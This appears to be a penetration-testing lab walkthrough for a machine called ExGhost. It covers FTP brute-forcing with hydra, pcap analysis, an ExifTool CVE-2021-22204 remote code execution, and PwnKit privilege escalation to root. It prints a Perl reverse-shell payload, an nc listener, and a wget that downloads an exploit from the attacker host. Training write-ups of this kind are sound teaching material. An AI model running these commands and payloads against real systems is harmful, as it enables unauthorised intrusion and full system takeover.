@@ -1,0 +1,198 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for ExGhost</h1>
+<h2>Summary</h2>
+<p>In this walkthrough, we will brute force FTP using default credentials and analyse the pcap file that leads to remote code execution in exif tool. Privilege escalation is done by exploiting a vulnerable version of the policykit-1 package.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll begin with an <code>nmap</code> scan.</p>
+<pre id="fence-code-15" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.120.161 -Pn
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:06 EST
+Nmap scan report for 192.168.120.161
+Host is up (0.27s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT   STATE  SERVICE
+21/tcp open   ftp
+80/tcp open   http
+
+Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds
+</code></pre>
+<p>The scan shows two services on their default ports: FTP on port 21 and HTTP on port 80.</p>
+<h3>HTTP Enumeration</h3>
+<p>Visitng port 80 gives us a "403 - Forbidden", brute forcing directories also doesn't reveals anything</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_102_image_1_s8xZFDu8.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<h3>FTP Enumeration</h3>
+<p>Anonymous login doesn't work. Let's try brute forcing FTP with default credentials, we'll use <code>ftp-betterdefaultpasslist.txt</code> list from <a href="https://github.com/danielmiessler/SecLists" target="_blank">Seclists</a></p>
+<pre id="fence-code-16" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-08 11:09:52
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
+[DATA] attacking ftp://192.168.120.161:21/
+[21][ftp] host: 192.168.120.161   login: user   password: system
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-08 11:10:10
+</code></pre>
+<p>Login to FTP using username <code>user</code> and password <code>system</code></p>
+<pre id="fence-code-17" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.120.161
+Connected to 192.168.120.161.
+220 (vsFTPd 3.0.3)
+Name (192.168.120.161:kali): user
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt;
+</code></pre>
+<p>Switch to passive mode to list the files and download the <code>backup</code> file</p>
+<pre id="fence-code-18" class="fence-code"><code> passive
+Passive mode: off; fallback to active mode: off.
+ftp&gt; dir
+200 EPRT command successful. Consider using EPSV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 0        0          126151 Jan 27 12:50 backup
+226 Directory send OK.
+ftp&gt; get backup
+local: backup remote: backup
+200 EPRT command successful. Consider using EPSV.
+150 Opening BINARY mode data connection for backup (126151 bytes).
+100% |*****************************************************************************************************************************************************************************************|   123 KiB  149.61 KiB/s    00:00 ETA
+226 Transfer complete.
+126151 bytes received in 00:01 (109.64 KiB/s)
+ftp&gt;
+</code></pre>
+<h3>PCAP Analysis</h3>
+<p>Since we don't know the filetype, let's use the <code>file</code> command to figure it out.</p>
+<pre id="fence-code-19" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ file backup        
+backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
+</code></pre>
+<p>It looks like a packet capture file, let's analyse it further using <code>wireshark</code></p>
+<pre id="fence-code-20" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wireshark -r backup                                                                                           
+ ** (wireshark:2357) 11:16:07.532661 [Main MESSAGE] -- Wireshark is up and ready to go, elapsed time 1.619s
+</code></pre>
+<p>Since we know that a webserver is running on port 80, let's set the filter to http and analyse the web requests</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_102_image_2_DEsko5Us.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>The POST request looks interesting, let's analyse it further by following the HTTP stream</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_102_image_3_3k8ahjBG.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>We see that an image is being uploaded to <code>exiftest.php</code>, let's make a note of this and have a look at the response.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_102_image_4_XpPHtn2d.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>The only interesting thing in response is "ExifTool Version Number: 12.23"</p>
+<h2>Exploitation</h2>
+<h3>ExifTool Remote Code Execution</h3>
+<p>Searching for exploits for <em>ExifTool 12.23</em> we come across a <a href="https://github.com/AssassinUKG/CVE-2021-22204" target="_blank">Remote Code Execution</a> exploit that fits our needs, let's download the exploit code.</p>
+<pre id="fence-code-21" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/AssassinUKG/CVE-2021-22204/main/CVE-2021-22204.sh
+</code></pre>
+<p>Inorder to run the exploit we need an image file, let's download one from the internet</p>
+<pre id="fence-code-22" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wget https://www.kali.org/images/notebook-kali-2022.1.jpg -O kali.jpg
+</code></pre>
+<p>Create a reverse shell payload with <code>reverse LHOST LPORT</code></p>
+<pre id="fence-code-23" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ chmod +x CVE-2021-22204.sh 
+                                                                                                                                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ bash CVE-2021-22204.sh "reverseme 192.168.118.18 80" kali.jpg                                                             
+   _____   _____   ___ __ ___ _    ___ ___ ___ __  _ _  
+  / __\ \ / / __|_|_  )  \_  ) |__|_  )_  )_  )  \| | | 
+ | (__ \ V /| _|___/ / () / /| |___/ / / / / / () |_  _|
+  \___| \_/ |___| /___\__/___|_|  /___/___/___\__/  |_| 
+                                                        
+Creating payload
+IP: 192.168.118.18
+PORT: 80
+(metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(80,inet_aton('192.168.118.18')))){open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/sh -i');};};};")
+
+
+    1 image files updated
+
+Finished
+</code></pre>
+<p>Start a listener.</p>
+<pre id="fence-code-24" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 80             
+listening on [any] 80 ...
+</code></pre>
+<p>Upload the file to <code>exiftest.php</code> using <code>curl</code></p>
+<pre id="fence-code-25" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl -F myFile=@kali.jpg http://192.168.120.161/exiftest.php
+</code></pre>
+<p>Our listener has caught the reverse shell.</p>
+<pre id="fence-code-26" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 80             
+listening on [any] 80 ...
+connect to [192.168.118.18] from (UNKNOWN) [192.168.120.161] 34082
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+</code></pre>
+<h2>Escalation</h2>
+<h3>Polkit Privilege Escalation</h3>
+<p>Enumerating the packages using <code>apt-cache</code> we see that the version of package <code>policykit-1</code> installed is old and vulnerable to <a href="https://ubuntu.com/security/cve-2021-4034" target="_blank">CVE-2021-4034</a> (pwnkit)</p>
+<pre id="fence-code-27" class="fence-code"><code>$ apt-cache policy policykit-1
+policykit-1:
+  Installed: 0.105-26ubuntu1.1
+  Candidate: 0.105-26ubuntu1.2
+  Version table:
+     0.105-26ubuntu1.2 500
+        500 http://us.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages
+        500 http://us.archive.ubuntu.com/ubuntu focal-security/main amd64 Packages
+ *** 0.105-26ubuntu1.1 100
+        100 /var/lib/dpkg/status
+     0.105-26ubuntu1 500
+        500 http://us.archive.ubuntu.com/ubuntu focal/main amd64 Packages
+</code></pre>
+<p>Since <code>gcc</code> is not installed on the system, let's use a python port of the exploit found <a href="https://github.com/joeammond/CVE-2021-4034" target="_blank">here</a>. Trasnfer the exploit and run it</p>
+<pre id="fence-code-28" class="fence-code"><code>$ cd /tmp
+$ python3 -c 'import pty;pty.spawn("/bin/bash");'
+www-data@exghost:/tmp$ wget http://192.168.118.18:8000/CVE-2021-4034.py
+wget http://192.168.118.18:8000/CVE-2021-4034.py
+--2022-03-08 16:50:16--  http://192.168.118.18:8000/CVE-2021-4034.py
+Connecting to 192.168.118.18:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3262 (3.2K) [text/x-python]
+Saving to: ‘CVE-2021-4034.py’
+
+CVE-2021-4034.py    100%[===================&gt;]   3.19K  --.-KB/s    in 0.001s  
+
+2022-03-08 16:50:17 (5.23 MB/s) - ‘CVE-2021-4034.py’ saved [3262/3262]
+
+www-data@exghost:/tmp$ python3 CVE-2021-4034.py
+python3 CVE-2021-4034.py
+[+] Creating shared library for exploit code.
+[+] Calling execve()
+# id
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+#
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
